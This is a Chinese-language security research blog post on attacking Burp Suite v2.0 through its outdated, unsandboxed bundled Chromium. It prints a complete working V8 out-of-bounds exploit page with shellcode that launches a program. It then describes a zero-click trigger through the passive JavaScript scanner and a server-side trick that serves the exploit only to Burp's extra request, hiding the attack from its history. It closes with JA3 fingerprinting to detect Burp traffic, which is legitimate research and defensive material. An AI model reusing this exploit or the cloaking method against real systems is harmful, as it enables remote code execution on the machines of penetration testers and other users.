  * [Home](http://noahblog.360.cn/)

  * [__Twitter](https://twitter.com/360TotalSec "@360TotalSec")
  * [__RSS](http://noahblog.360.cn/rss/ "RSS")
  * __Search

__Menu __Search

Article

# 反制爬虫之Burp Suite RCE

#### [Wfox](/author/wfox/)

06 Sep 2021 • 9 min read

## 一、前言

Headless Chrome是谷歌Chrome浏览器的无界面模式，通过命令行方式打开网页并渲染，常用于自动化测试、网站爬虫、网站截图、XSS检测等场景。

近几年许多桌面客户端应用中，基本都内嵌了Chromium用于业务场景使用，但由于开发不当、CEF版本不升级维护等诸多问题，攻击者可以利用这些缺陷攻击客户端应用以达到命令执行效果。

本文以知名渗透软件Burp Suite举例，从软件分析、漏洞挖掘、攻击面扩展等方面进行深入探讨。

## 二、软件分析

以Burp Suite Pro v2.0beta版本为例，要做漏洞挖掘首先要了解软件架构及功能点。

将`burpsuite_pro_v2.0.11beta.jar`进行解包，可以发现Burp
Suite打包了Windows、Linux、Mac的Chromium，可以兼容在不同系统下运行内置Chromium浏览器。

![-w869](http://p2.qhimg.com/t016c1d11eb7ca184f2.jpg)

在Windows系统中，Burp Suite v2.0运行时会将`chromium-
win64.7z`解压至`C:\Users\user\AppData\Local\JxBrowser\browsercore-64.0.3282.24.unknown\`目录

![](http://p9.qhimg.com/t014d1f0ad66c33fa4a.jpg)

从目录名及数字签名得知Burp Suite v2.0是直接引用JxBrowser浏览器控件，其打包的Chromium版本为64.0.3282.24。

那如何在Burp Suite中使用内置浏览器呢？在常见的使用场景中，`Proxy -> HTTP history -> Response ->
Render`及`Repeater -> Render`都能够调用内置Chromium浏览器渲染网页。

![](http://p3.qhimg.com/t017313d7eb7e9cd6b2.jpg)

当Burp
Suite唤起内置浏览器`browsercore32.exe`打开网页时，`browsercore32.exe`会创建Renderer进程及GPU加速进程。

![](http://p4.qhimg.com/t013fe4ab46f85e581a.jpg)

browsercore32.exe进程运行参数如下：

    
    
    // Chromium主进程
    C:\Users\user\AppData\Local\JxBrowser\browsercore-64.0.3282.24.unknown\browsercore32.exe --port=53070 --pid=13208 --dpi-awareness=system-aware --crash-dump-dir=C:\Users\user\AppData\Local\JxBrowser --lang=zh-CN --no-sandbox --disable-xss-auditor --headless --disable-gpu --log-level=2 --proxy-server="socks://127.0.0.1:0" --disable-bundled-ppapi-flash --disable-plugins-discovery --disable-default-apps --disable-extensions --disable-prerender-local-predictor --disable-save-password-bubble --disable-sync --disk-cache-size=0 --incognito --media-cache-size=0 --no-events --disable-settings-window
    
    // Renderer进程
    C:\Users\user\AppData\Local\JxBrowser\browsercore-64.0.3282.24.unknown\browsercore32.exe --type=renderer --log-level=2 --no-sandbox --disable-features=LoadingWithMojo,browser-side-navigation --disable-databases --disable-gpu-compositing --service-pipe-token=C06434E20AA8C9230D15FCDFE9C96993 --lang=zh-CN --crash-dump-dir="C:\Users\user\AppData\Local\JxBrowser" --enable-pinch --device-scale-factor=1 --num-raster-threads=1 --enable-gpu-async-worker-context --disable-accelerated-video-decode --service-request-channel-token=C06434E20AA8C9230D15FCDFE9C96993 --renderer-client-id=2 --mojo-platform-channel-handle=2564 /prefetch:1
    

从进程运行参数分析得知，Chromium进程以headless模式运行、关闭了沙箱功能、随机监听一个端口（用途未知）。

## 三、漏洞利用

Chromium组件的历史版本几乎都存在着1Day漏洞风险，特别是在客户端软件一般不会维护升级Chromium版本，且关闭沙箱功能，在没有沙箱防护的情况下漏洞可以无限制利用。

Burp Suite
v2.0内置的Chromium版本为64.0.3282.24，该低版本Chromium受到多个历史漏洞影响，可以通过v8引擎漏洞执行shellcode从而获得PC权限。

以Render功能演示，利用v8漏洞触发shellcode打开计算器（此处感谢Sakura提供漏洞利用代码）

这个漏洞没有公开的CVE
ID，但其详情可以在[这里](https://bugs.chromium.org/p/chromium/issues/detail?id=880207)找到。  
该漏洞的Root Cause是在进行`Math.expm1`的范围分析时，推断出的类型是`Union(PlainNumber,
NaN)`，忽略了`Math.expm1(-0)`会返回`-0`的情况，从而导致范围分析错误，导致JIT优化时，错误的将边界检查CheckBounds移除，造成了OOB漏洞。

    
    
    <html>
    <head></head>
    </body>
    <script>
    function pwn() {
        var f64Arr = new Float64Array(1);
        var u32Arr = new Uint32Array(f64Arr.buffer);
    
        function f2u(f) {
            f64Arr[0] = f;
            return u32Arr;
        }
    
        function u2f(h, l)
        {
            u32Arr[0] = l;
            u32Arr[1] = h;
            return f64Arr[0];
        }
    
        function hex(i) {
            return "0x" + i.toString(16).padStart(8, "0");
        }
    
        function log(str) {
            console.log(str);
            document.body.innerText += str + '\n';
        }
    
        var big_arr = [1.1, 1.2];
        var ab = new ArrayBuffer(0x233);
        var data_view = new DataView(ab);
    
        function opt_me(x) {
            var oob_arr = [1.1, 1.2, 1.3, 1.4, 1.5, 1.6];
            big_arr = [1.1, 1.2];
            ab = new ArrayBuffer(0x233);
            data_view = new DataView(ab);
    
            let obj = {
                a: -0
            };
            let idx = Object.is(Math.expm1(x), obj.a) * 10;
    
            var tmp = f2u(oob_arr[idx])[0];
            oob_arr[idx] = u2f(0x234, tmp);
        }
        for (let a = 0; a < 0x1000; a++)
            opt_me(0);
    
        opt_me(-0);
        var optObj = {
            flag: 0x266,
            funcAddr: opt_me
        };
    
        log("[+] big_arr.length: " + big_arr.length);
    
        if (big_arr.length != 282) {
            log("[-] Can not modify big_arr length !");
            return;
        }
        var backing_store_idx = -1;
        var backing_store_in_hign_mem = false;
        var OptObj_idx = -1;
        var OptObj_idx_in_hign_mem = false;
    
        for (let a = 0; a < 0x100; a++) {
            if (backing_store_idx == -1) {
                if (f2u(big_arr[a])[0] == 0x466) {
                    backing_store_in_hign_mem = true;
                    backing_store_idx = a;
                } else if (f2u(big_arr[a])[1] == 0x466) {
                    backing_store_in_hign_mem = false;
                    backing_store_idx = a + 1;
                }
            }
    
            else if (OptObj_idx == -1) {
                if (f2u(big_arr[a])[0] == 0x4cc) {
                    OptObj_idx_in_hign_mem = true;
                    OptObj_idx = a;
                } else if (f2u(big_arr[a])[1] == 0x4cc) {
                    OptObj_idx_in_hign_mem = false;
                    OptObj_idx = a + 1;
                }
            }
    
        }
    
        if (backing_store_idx == -1) {
            log("[-] Can not find backing store !");
            return;
        } else
            log("[+] backing store idx: " + backing_store_idx +
                ", in " + (backing_store_in_hign_mem ? "high" : "low") + " place.");
    
        if (OptObj_idx == -1) {
            log("[-] Can not find Opt Obj !");
            return;
        } else
            log("[+] OptObj idx: " + OptObj_idx +
                ", in " + (OptObj_idx_in_hign_mem ? "high" : "low") + " place.");
    
        var backing_store = (backing_store_in_hign_mem ?
            f2u(big_arr[backing_store_idx])[1] :
            f2u(big_arr[backing_store_idx])[0]);
        log("[+] Origin backing store: " + hex(backing_store));
    
        var dataNearBS = (!backing_store_in_hign_mem ?
            f2u(big_arr[backing_store_idx])[1] :
            f2u(big_arr[backing_store_idx])[0]);
    
        function read(addr) {
            if (backing_store_in_hign_mem)
                big_arr[backing_store_idx] = u2f(addr, dataNearBS);
            else
                big_arr[backing_store_idx] = u2f(dataNearBS, addr);
            return data_view.getInt32(0, true);
        }
    
        function write(addr, msg) {
            if (backing_store_in_hign_mem)
                big_arr[backing_store_idx] = u2f(addr, dataNearBS);
            else
                big_arr[backing_store_idx] = u2f(dataNearBS, addr);
            data_view.setInt32(0, msg, true);
        }
    
        var OptJSFuncAddr = (OptObj_idx_in_hign_mem ?
            f2u(big_arr[OptObj_idx])[1] :
            f2u(big_arr[OptObj_idx])[0]) - 1;
        log("[+] OptJSFuncAddr: " + hex(OptJSFuncAddr));
    
        var OptJSFuncCodeAddr = read(OptJSFuncAddr + 0x18) - 1;
        log("[+] OptJSFuncCodeAddr: " + hex(OptJSFuncCodeAddr));
    
        var RWX_Mem_Addr = OptJSFuncCodeAddr + 0x40;
        log("[+] RWX Mem Addr: " + hex(RWX_Mem_Addr));
    
        var shellcode = new Uint8Array(
               [0x89, 0xe5, 0x83, 0xec, 0x20, 0x31, 0xdb, 0x64, 0x8b, 0x5b, 0x30, 0x8b, 0x5b, 0x0c, 0x8b, 0x5b,
                0x1c, 0x8b, 0x1b, 0x8b, 0x1b, 0x8b, 0x43, 0x08, 0x89, 0x45, 0xfc, 0x8b, 0x58, 0x3c, 0x01, 0xc3,
                0x8b, 0x5b, 0x78, 0x01, 0xc3, 0x8b, 0x7b, 0x20, 0x01, 0xc7, 0x89, 0x7d, 0xf8, 0x8b, 0x4b, 0x24,
                0x01, 0xc1, 0x89, 0x4d, 0xf4, 0x8b, 0x53, 0x1c, 0x01, 0xc2, 0x89, 0x55, 0xf0, 0x8b, 0x53, 0x14,
                0x89, 0x55, 0xec, 0xeb, 0x32, 0x31, 0xc0, 0x8b, 0x55, 0xec, 0x8b, 0x7d, 0xf8, 0x8b, 0x75, 0x18,
                0x31, 0xc9, 0xfc, 0x8b, 0x3c, 0x87, 0x03, 0x7d, 0xfc, 0x66, 0x83, 0xc1, 0x08, 0xf3, 0xa6, 0x74,
                0x05, 0x40, 0x39, 0xd0, 0x72, 0xe4, 0x8b, 0x4d, 0xf4, 0x8b, 0x55, 0xf0, 0x66, 0x8b, 0x04, 0x41,
                0x8b, 0x04, 0x82, 0x03, 0x45, 0xfc, 0xc3, 0xba, 0x78, 0x78, 0x65, 0x63, 0xc1, 0xea, 0x08, 0x52,
                0x68, 0x57, 0x69, 0x6e, 0x45, 0x89, 0x65, 0x18, 0xe8, 0xb8, 0xff, 0xff, 0xff, 0x31, 0xc9, 0x51,
                0x68, 0x2e, 0x65, 0x78, 0x65, 0x68, 0x63, 0x61, 0x6c, 0x63, 0x89, 0xe3, 0x41, 0x51, 0x53, 0xff,
                0xd0, 0x31, 0xc9, 0xb9, 0x01, 0x65, 0x73, 0x73, 0xc1, 0xe9, 0x08, 0x51, 0x68, 0x50, 0x72, 0x6f,
                0x63, 0x68, 0x45, 0x78, 0x69, 0x74, 0x89, 0x65, 0x18, 0xe8, 0x87, 0xff, 0xff, 0xff, 0x31, 0xd2,
                0x52, 0xff, 0xd0, 0x90, 0x90, 0xfd, 0xff]
        );
    
        log("[+] writing shellcode ... ");
        for (let i = 0; i < shellcode.length; i++)
            write(RWX_Mem_Addr + i, shellcode[i]);
    
        log("[+] execute shellcode !");
        opt_me();
    }
    pwn();
    </script>
    </body>
    </html>
    

用户在通过Render功能渲染页面时触发v8漏洞成功执行shellcode。

![](http://p6.qhimg.com/t01cb6514c94e277cd2.jpg)

## 四、进阶攻击

Render功能需要用户交互才能触发漏洞，相对来说比较鸡肋，能不能0click触发漏洞？答案是可以的。

Burp Suite v2.0的`Live audit from Proxy`被动扫描功能在默认情况下开启JavaScript分析引擎（JavaScript
analysis），用于扫描JavaScript漏洞。

![](http://p4.qhimg.com/t01546b26685e10b63b.jpg)

其中JavaScript分析配置中，默认开启了动态分析功能（[dynamic analysis
techniques](https://portswigger.net/blog/dynamic-analysis-of-
javascript)）、额外请求功能（Make requests for missing Javascript dependencies）  

![](http://p1.qhimg.com/t012feccf054401740d.jpg)

JavaScript动态分析功能会调用内置chromium浏览器对页面中的JavaScript进行DOM
XSS扫描，同样会触发页面中的HTML渲染、JavaScript执行，从而触发v8漏洞执行shellcode。

额外请求功能当页面存在script标签引用外部JS时，除了页面正常渲染时请求加载script标签，还会额外发起请求加载外部JS。即两次请求加载外部JS文件，并且分别执行两次JavaScript动态分析。

额外发起的HTTP请求会存在明文特征，后端可以根据该特征在正常加载时返回正常JavaScript代码，额外加载时返回漏洞利用代码，从而可以实现在Burp
Suite HTTP history中隐藏攻击行为。

    
    
    GET /xxx.js HTTP/1.1
    Host: www.xxx.com
    Connection: close
    Cookie: JSESSIONID=3B6FD6BC99B03A63966FC9CF4E8483FF
    

JavaScript动态分析 + 额外请求 + chromium漏洞组合利用效果：

![Kapture 2021-09-06 at 2.14.35](http://p9.qhimg.com/t013ae43de7151c0bde.gif)

## 五、流量特征检测

默认情况下Java发起HTTPS请求时协商的算法会受到JDK及操作系统版本影响，而Burp
Suite自己实现了HTTPS请求库，其TLS握手协商的算法是固定的，结合JA3算法形成了TLS流量指纹特征可被检测，有关于JA3检测的知识点可学习《[TLS
Fingerprinting with JA3 and JA3S](https://engineering.salesforce.com/tls-
fingerprinting-with-ja3-and-ja3s-247362855967)》。

[Cloudflare](https://portswigger.net/daily-swig/https-everywhere-cloudflare-
planning-improvements-to-middleware-detection-
utility)开源并在CDN产品上应用了[MITMEngine](https://github.com/cloudflare/mitmengine)组件，通过TLS指纹识别可检测出恶意请求并拦截，其覆盖了大多数Burp
Suite版本的JA3指纹从而实现检测拦截。这也可以解释为什么在渗透测试时使用Burp Suite请求无法获取到响应包。

以Burp Suite v2.0举例，实际测试在各个操作系统下，同样的jar包发起的JA3指纹是一样的。

![-w672](http://p4.qhimg.com/t01fb4375e5726e8ffc.jpg)

不同版本Burp Suite支持的TLS算法不一样会导致JA3指纹不同，但同样的Burp Suite版本JA3指纹肯定是一样的。如果需要覆盖Burp
Suite流量检测只需要将每个版本的JA3指纹识别覆盖即可检测Burp Suite攻击从而实现拦截。

本文章涉及内容仅限防御对抗、安全研究交流，请勿用于非法途径。

Share [ __Twitter ](https://twitter.com/share?text=反制爬虫之Burp Suite
RCE&url=http://noahblog.360.cn/burp-suite-rce/ "Twitter") [ __Facebook
](https://www.facebook.com/sharer/sharer.php?u=http://noahblog.360.cn/burp-
suite-rce/ "Facebook") [ __LinkedIn
](https://www.linkedin.com/shareArticle?mini=true&url=http://noahblog.360.cn/burp-
suite-rce//&title=反制爬虫之Burp Suite RCE "LinkedIn") [ __Email
](mailto:?subject=反制爬虫之Burp Suite RCE&body=http://noahblog.360.cn/burp-suite-
rce/ "Email")

Show Comments

[ __

## Zabbix攻击面挖掘与利用

一、简介 Zabbix是一个支持实时监控数千台服务器、虚拟机和网络设备的企业级解决方案，客户覆盖许多大型企业。本议题介绍了Zabbix基础架构、Zabbix
Server攻击面以及权限后利用，如何在复杂内网环境中从Agent控制Server权限、再基于Server拿下所有内网Agent。
二、Zabbix监控组件…

17 Aug 2021

](/zabbixgong-ji-mian-wa-jue-yu-li-yong/)

Noah Lab (C) 2021 Published with [Ghost](https://ghost.org) • Theme
[Attila](https://github.com/zutrinken/attila)

